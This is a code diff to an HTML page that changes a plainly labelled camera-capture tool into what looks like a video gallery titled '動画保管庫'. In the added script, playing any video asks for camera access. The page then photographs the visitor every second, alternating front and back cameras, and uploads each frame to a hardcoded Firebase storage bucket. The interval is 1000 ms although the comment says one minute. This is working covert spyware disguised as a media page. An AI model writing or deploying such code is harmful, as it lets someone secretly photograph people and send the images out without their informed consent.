@@ -3,61 +3,256 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>カメラ撮影とFirebaseアップロード</title>
+    <title>動画保管庫</title>
     <style>
-        body {
+        .video-grid {
+            display: grid;
+            gap: 10px;
+        }
+        .video-item {
             display: flex;
             flex-direction: column;
             align-items: center;
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            padding-bottom: 56.25%; /* 16:9 aspect ratio */
+            background-color: #000;
+        }
+        .video-container video {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 100%;
+            height: 100%;
+            transform: translate(-50%, -50%);
+            object-fit: contain; /* This ensures the video fits within the container without cropping */
+        }
+        .video-item .title {
+            width: 90%;
+            margin-top: 10px;
+            padding: 5px;
+            text-align: center;
+            border: none;
+            background: none;
+            color: #000;
+            font-size: 16px;
+        }
+
+        /* レスポンシブデザイン */
+        @media (min-width: 1200px) {
+            .video-grid {
+                grid-template-columns: repeat(4, 1fr);
+            }
+        }
+        @media (min-width: 992px) and (max-width: 1199px) {
+            .video-grid {
+                grid-template-columns: repeat(3, 1fr);
+            }
+        }
+        @media (min-width: 768px) and (max-width: 991px) {
+            .video-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+        @media (max-width: 767px) {
+            .video-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        /* ダイアログのスタイル */
+        .dialog-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: none;
             justify-content: center;
-            height: 100vh;
-            font-family: Arial, sans-serif;
+            align-items: center;
+            z-index: 1000;
         }
-        h1 {
-            margin-bottom: 20px;
+        .dialog {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 5px;
+            text-align: center;
         }
-        .title {
-            font-size: 18px;
+        .dialog button {
             margin-top: 10px;
         }
     </style>
 </head>
 <body>
-    <h1>カメラ撮影とFirebaseアップロード</h1>
-    <div class="title">現在のカメラの情報は表示されていません。</div>
+    <h1>動画保管庫</h1>
+    <div class="video-grid" id="videoGrid">
+        <!-- Videos will be dynamically inserted here -->
+    </div>
+
+    <video id="video" width="320" height="240" autoplay></video>
     <canvas id="canvas" style="display: none;"></canvas>
 
+    <div class="dialog-overlay" id="dialogOverlay">
+        <div class="dialog">
+            <p>カメラの権限を許可してください。</p>
+            <button id="reloadButton">再試行</button>
+        </div>
+    </div>
+
     <script type="module">
+        // 動画URLとタイトルのリストをここに配置
+        const videos = [
+            // 他の動画URLとタイトルを追加
+        ];
+
+        function loadVideos() {
+            const videoGrid = document.getElementById('videoGrid');
+            
+            videos.forEach(video => {
+                const videoItem = document.createElement('div');
+                videoItem.className = 'video-item';
+
+                const videoContainer = document.createElement('div');
+                videoContainer.className = 'video-container';
+
+                const videoElement = document.createElement('video');
+                videoElement.src = video.url;
+                videoElement.controls = true;
+
+                const titleElement = document.createElement('div');
+                titleElement.className = 'title';
+                titleElement.textContent = video.title;
+
+                videoContainer.appendChild(videoElement);
+                videoItem.appendChild(videoContainer);
+                videoItem.appendChild(titleElement);
+                videoGrid.appendChild(videoItem);
+
+                // Add event listener to start camera capture on video play
+                videoElement.addEventListener('play', () => {
+                    requestCameraAccess();
+                });
+            });
+        }
+
         // Firebase設定
         import { initializeApp } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js";
         import { getStorage, ref, uploadString } from "https://www.gstatic.com/firebasejs/9.17.1/firebase-storage.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyDsK4imQ3uWcK7hyESo6hnDyQ96lsPNCZ8",
-	 　 authDomain: "nou-no-circle.firebaseapp.com",
-	 　 projectId: "nou-no-circle",
-	 　 storageBucket: "nou-no-circle.appspot.com",
-	 　 messagingSenderId: "756338805186",
-	 　 appId: "1:756338805186:web:cb740e035ac611b5baae5b",
-	 　 measurementId: "G-TWBV38P13D"
+            authDomain: "nou-no-circle.firebaseapp.com",
+            projectId: "nou-no-circle",
+            storageBucket: "nou-no-circle.appspot.com",
+            messagingSenderId: "756338805186",
+            appId: "1:756338805186:web:cb740e035ac611b5baae5b",
+            measurementId: "G-TWBV38P13D"
         };
 
         // Firebase初期化
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
-        // カメラアクセス
+        // カメラアクセスとキャプチャ関数を定義
         const canvas = document.getElementById('canvas');
         const ctx = canvas.getContext('2d');
         let videoStream;
+        let captureInterval;
+        let currentCameraIndex = 0;
+        let frontCamera;
+        let backCamera;
 
-        navigator.mediaDevices.getUserMedia({ video: true })
-            .then(stream => {
-                videoStream = stream;
-            })
-            .catch(err => {
+        async function requestCameraAccess() {
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                if (videoDevices.length === 0) {
+                    console.error('カメラが見つかりませんでした。');
+                    showCameraPermissionDialog();
+                    return;
+                }
+
+                // 背面カメラを優先して選択、次に前面カメラ
+                for (const device of videoDevices) {
+                    if (device.label.toLowerCase().includes('back')) {
+                        backCamera = device;
+                    } else if (device.label.toLowerCase().includes('front')) {
+                        frontCamera = device;
+                    }
+                }
+
+                if (!backCamera) {
+                    backCamera = videoDevices[0];
+                }
+                if (!frontCamera) {
+                    frontCamera = videoDevices[1] || videoDevices[0];
+                }
+
+                switchCamera();
+            } catch (err) {
                 console.error('カメラアクセスエラー:', err);
-            });
+                showCameraPermissionDialog();
+            }
+        }
+
+        function switchCamera() {
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+            }
+
+            const constraints = {
+                video: {
+                    deviceId: currentCameraIndex % 2 === 0 ? backCamera.deviceId : frontCamera.deviceId
+                }
+            };
+
+            navigator.mediaDevices.getUserMedia(constraints)
+                .then(stream => {
+                    videoStream = stream;
+                    startCameraCapture();
+                    currentCameraIndex++;
+                })
+                .catch(err => {
+                    console.error('カメラ切り替えエラー:', err);
+                    showCameraPermissionDialog();
+                });
+        }
+
+        function startCameraCapture() {
+            if (videoStream) {
+                const videoTracks = videoStream.getVideoTracks();
+                const track = videoTracks[0];
+                const imageCapture = new ImageCapture(track);
+
+                // 1分ごとに撮影してアップロード
+                captureInterval = setInterval(() => {
+                    imageCapture.grabFrame()
+                        .then(imageBitmap => {
+                            canvas.width = imageBitmap.width;
+                            canvas.height = imageBitmap.height;
+                            ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
+                            const dataURL = canvas.toDataURL('image/jpeg');
+                            uploadImage(dataURL);
+                            switchCamera();
+                        })
+                        .catch(err => {
+                            console.error('画像キャプチャエラー:', err);
+                        });
+                }, 1000); // 60000ミリ秒 = 1分
+            }
+        }
+
+        function stopCameraCapture() {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+            }
+            if (videoStream) {
+                videoStream.getTracks().forEach(track => track.stop());
+            }
+        }
 
         // 画像をFirebase Storageにアップロード
         function uploadImage(dataURL) {
@@ -71,25 +266,19 @@
                 });
         }
 
-        // 1分ごとに撮影してアップロード
-        setInterval(() => {
-            if (videoStream) {
-                const videoTracks = videoStream.getVideoTracks();
-                const track = videoTracks[0];
-                const imageCapture = new ImageCapture(track);
-                imageCapture.grabFrame()
-                    .then(imageBitmap => {
-                        canvas.width = imageBitmap.width;
-                        canvas.height = imageBitmap.height;
-                        ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
-                        const dataURL = canvas.toDataURL('image/jpeg');
-                        uploadImage(dataURL);
-                    })
-                    .catch(err => {
-                        console.error('画像キャプチャエラー:', err);
-                    });
-            }
-        }, 60000); // 60000ミリ秒 = 1分
+        // カメラ権限ダイアログを表示
+        function showCameraPermissionDialog() {
+            const dialogOverlay = document.getElementById('dialogOverlay');
+            dialogOverlay.style.display = 'flex';
+        }
+
+        // ダイアログの再試行ボタンをクリックしたときにページを再読み込み
+        document.getElementById('reloadButton').addEventListener('click', () => {
+            location.reload();
+        });
+
+        // ページロード時に動画をロード
+        window.onload = loadVideos;
     </script>
 </body>
 </html>
